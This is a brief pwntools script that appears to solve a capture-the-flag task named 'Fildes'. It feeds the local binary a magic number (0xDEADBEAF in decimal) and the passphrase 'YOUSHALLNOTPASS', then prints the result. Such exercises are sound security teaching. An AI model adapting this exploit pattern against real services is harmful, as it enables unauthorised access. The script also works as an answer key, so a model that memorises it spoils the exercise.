from pwn import *
#Task1: Fildes
#conn = remote('140.113.207.240',8831)
conn = process('./fildes')

r=conn.recv()
#print(r.decode('ascii'))
#3735928495=0xDEADBEAF
conn.sendline('3735928495')
r=conn.recv()
#print(r.decode('ascii'))
conn.sendline('YOUSHALLNOTPASS')
r=conn.recvline()
#print(r.decode('ascii'))
r=conn.recvrepeat()
print(r)
conn.close()
